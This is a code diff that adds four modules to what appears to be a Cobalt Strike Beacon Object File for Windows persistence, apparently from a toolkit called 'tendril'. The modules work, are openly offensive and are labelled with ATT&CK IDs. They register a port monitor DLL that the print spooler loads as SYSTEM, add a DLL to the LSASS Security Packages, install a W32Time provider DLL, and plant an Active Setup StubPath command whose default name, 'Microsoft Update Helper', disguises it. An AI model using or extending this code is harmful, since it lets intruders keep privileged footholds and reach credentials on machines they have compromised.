@@ -24,6 +24,10 @@ enum {
 	MOD_ACCESSIBILITY,
 	MOD_NETSH_HELPER,
 	MOD_USERINIT_MPR,
+	MOD_PORT_MONITOR,
+	MOD_SSP,
+	MOD_TIME_PROVIDER,
+	MOD_ACTIVE_SETUP,
 	MOD_COUNT
 };
 
@@ -472,6 +476,138 @@ static void mod_userinit_mpr(short action, wchar_t* arg1, wchar_t* arg2, wchar_t
 }
 
 /* ================================================================
+ * PORT MONITOR DLL - Print Spooler loads as SYSTEM (T1547.010)
+ * arg1=dll_filename  arg2=monitor_name  arg3 unused
+ * ================================================================ */
+#define PRINT_MONITORS L"SYSTEM\\CurrentControlSet\\Control\\Print\\Monitors"
+
+static void mod_port_monitor(short action, wchar_t* arg1, wchar_t* arg2, wchar_t* arg3)
+{
+    wchar_t keyPath[512];
+    KERNEL32$lstrcpyW(keyPath, PRINT_MONITORS);
+    KERNEL32$lstrcatW(keyPath, L"\\");
+    KERNEL32$lstrcatW(keyPath, arg2[0] ? arg2 : L"LocalPrintMonitor");
+
+    if (action == ACT_INSTALL)
+    {
+        LSTATUS s = tendril_reg_set_sz(HKEY_LOCAL_MACHINE, keyPath, L"Driver", arg1);
+        BeaconPrintf(s == ERROR_SUCCESS ? CALLBACK_OUTPUT : CALLBACK_ERROR,
+            s == ERROR_SUCCESS ? "[+] Port monitor: %ls -> %ls" : "[-] Failed: %d", arg2, arg1, s);
+    }
+    else if (action == ACT_REMOVE)
+    {
+        ADVAPI32$RegDeleteKeyExW(HKEY_LOCAL_MACHINE, keyPath, KEY_WOW64_64KEY, 0);
+        BeaconPrintf(CALLBACK_OUTPUT, "[+] Port monitor removed");
+    }
+    else
+        BeaconPrintf(CALLBACK_OUTPUT, "[*] Use 'check' via C# assembly for port monitor enumeration");
+}
+
+/* ================================================================
+ * SSP - LSASS Security Support Provider (T1547.005)
+ * arg1=dll_name (no .dll ext)  arg2/arg3 unused
+ * Note: modifies REG_MULTI_SZ - uses raw registry API
+ * ================================================================ */
+static void mod_ssp(short action, wchar_t* arg1, wchar_t* arg2, wchar_t* arg3)
+{
+    LPCWSTR lsaPath = L"SYSTEM\\CurrentControlSet\\Control\\Lsa";
+    HKEY hKey;
+
+    if (action == ACT_INSTALL)
+    {
+        /* Read current Security Packages, append our DLL name */
+        LSTATUS s = ADVAPI32$RegOpenKeyExW(HKEY_LOCAL_MACHINE, lsaPath, 0,
+            KEY_READ | KEY_WRITE | KEY_WOW64_64KEY, &hKey);
+        if (s != ERROR_SUCCESS) { BeaconPrintf(CALLBACK_ERROR, "[-] Cannot open Lsa: %d", s); return; }
+
+        BYTE buf[4096] = {0};
+        DWORD cbData = sizeof(buf), type;
+        ADVAPI32$RegQueryValueExW(hKey, L"Security Packages", NULL, &type, buf, &cbData);
+
+        /* Append new entry: find end of multi-string (double null), insert before it */
+        wchar_t* p = (wchar_t*)buf;
+        while (*p) { p += KERNEL32$lstrlenW(p) + 1; }
+        KERNEL32$lstrcpyW(p, arg1);
+        p += KERNEL32$lstrlenW(arg1) + 1;
+        *p = 0; /* double null terminator */
+
+        DWORD newSize = (DWORD)((BYTE*)(p + 1) - buf);
+        s = ADVAPI32$RegSetValueExW(hKey, L"Security Packages", 0, REG_MULTI_SZ, buf, newSize);
+        ADVAPI32$RegCloseKey(hKey);
+
+        BeaconPrintf(s == ERROR_SUCCESS ? CALLBACK_OUTPUT : CALLBACK_ERROR,
+            s == ERROR_SUCCESS ? "[+] SSP registered: %ls (reboot to load)" : "[-] Failed: %d", arg1, s);
+    }
+    else if (action == ACT_REMOVE)
+    {
+        BeaconPrintf(CALLBACK_OUTPUT, "[*] SSP removal requires REG_MULTI_SZ edit - use C# assembly or manual reg edit");
+    }
+    else
+        BeaconPrintf(CALLBACK_OUTPUT, "[*] Use 'check' via C# assembly for SSP enumeration");
+}
+
+/* ================================================================
+ * TIME PROVIDER DLL - W32Time loads as SYSTEM (T1547.003)
+ * arg1=dll_path  arg2=provider_name  arg3 unused
+ * ================================================================ */
+#define TIME_PROVIDERS L"SYSTEM\\CurrentControlSet\\Services\\W32Time\\TimeProviders"
+
+static void mod_time_provider(short action, wchar_t* arg1, wchar_t* arg2, wchar_t* arg3)
+{
+    wchar_t keyPath[512];
+    KERNEL32$lstrcpyW(keyPath, TIME_PROVIDERS);
+    KERNEL32$lstrcatW(keyPath, L"\\");
+    KERNEL32$lstrcatW(keyPath, arg2[0] ? arg2 : L"NtpClientSync");
+
+    if (action == ACT_INSTALL)
+    {
+        tendril_reg_set_sz(HKEY_LOCAL_MACHINE, keyPath, L"DllName", arg1);
+        tendril_reg_set_dword(HKEY_LOCAL_MACHINE, keyPath, L"Enabled", 1);
+        LSTATUS s = tendril_reg_set_dword(HKEY_LOCAL_MACHINE, keyPath, L"InputProvider", 0);
+        BeaconPrintf(s == ERROR_SUCCESS ? CALLBACK_OUTPUT : CALLBACK_ERROR,
+            s == ERROR_SUCCESS ? "[+] Time provider: %ls -> %ls" : "[-] Failed: %d", arg2, arg1, s);
+    }
+    else if (action == ACT_REMOVE)
+    {
+        ADVAPI32$RegDeleteKeyExW(HKEY_LOCAL_MACHINE, keyPath, KEY_WOW64_64KEY, 0);
+        BeaconPrintf(CALLBACK_OUTPUT, "[+] Time provider removed");
+    }
+    else
+        BeaconPrintf(CALLBACK_OUTPUT, "[*] Use 'check' via C# assembly for time provider enumeration");
+}
+
+/* ================================================================
+ * ACTIVE SETUP - per-user StubPath execution (T1547.014)
+ * arg1=command  arg2=GUID  arg3=ComponentID
+ * ================================================================ */
+#define ACTIVE_SETUP_PATH L"SOFTWARE\\Microsoft\\Active Setup\\Installed Components"
+
+static void mod_active_setup(short action, wchar_t* arg1, wchar_t* arg2, wchar_t* arg3)
+{
+    wchar_t keyPath[512];
+    KERNEL32$lstrcpyW(keyPath, ACTIVE_SETUP_PATH);
+    KERNEL32$lstrcatW(keyPath, L"\\");
+    KERNEL32$lstrcatW(keyPath, arg2);
+
+    if (action == ACT_INSTALL)
+    {
+        tendril_reg_set_sz(HKEY_LOCAL_MACHINE, keyPath, L"StubPath", arg1);
+        tendril_reg_set_sz(HKEY_LOCAL_MACHINE, keyPath, L"Version", L"1,0,0,0");
+        LSTATUS s = tendril_reg_set_sz(HKEY_LOCAL_MACHINE, keyPath, L"ComponentID",
+            arg3[0] ? arg3 : L"Microsoft Update Helper");
+        BeaconPrintf(s == ERROR_SUCCESS ? CALLBACK_OUTPUT : CALLBACK_ERROR,
+            s == ERROR_SUCCESS ? "[+] Active Setup: %ls -> %ls" : "[-] Failed: %d", arg2, arg1, s);
+    }
+    else if (action == ACT_REMOVE)
+    {
+        ADVAPI32$RegDeleteKeyExW(HKEY_LOCAL_MACHINE, keyPath, KEY_WOW64_64KEY, 0);
+        BeaconPrintf(CALLBACK_OUTPUT, "[+] Active Setup removed: %ls", arg2);
+    }
+    else
+        BeaconPrintf(CALLBACK_OUTPUT, "[*] Use 'check' via C# assembly for Active Setup enumeration");
+}
+
+/* ================================================================
  * DISPATCH - single entry point
  * ================================================================ */
 void go(char* args, int alen)
@@ -499,6 +635,10 @@ void go(char* args, int alen)
 	case MOD_ACCESSIBILITY:   mod_accessibility(action, arg1, arg2, arg3);   break;
 	case MOD_NETSH_HELPER:    mod_netsh_helper(action, arg1, arg2, arg3);    break;
 	case MOD_USERINIT_MPR:    mod_userinit_mpr(action, arg1, arg2, arg3);    break;
+	case MOD_PORT_MONITOR:    mod_port_monitor(action, arg1, arg2, arg3);    break;
+	case MOD_SSP:             mod_ssp(action, arg1, arg2, arg3);             break;
+	case MOD_TIME_PROVIDER:   mod_time_provider(action, arg1, arg2, arg3);   break;
+	case MOD_ACTIVE_SETUP:    mod_active_setup(action, arg1, arg2, arg3);    break;
 	default:
 		BeaconPrintf(CALLBACK_ERROR, "[-] Unknown module ID: %d (valid: 0-%d)", module, MOD_COUNT - 1);
 		break;
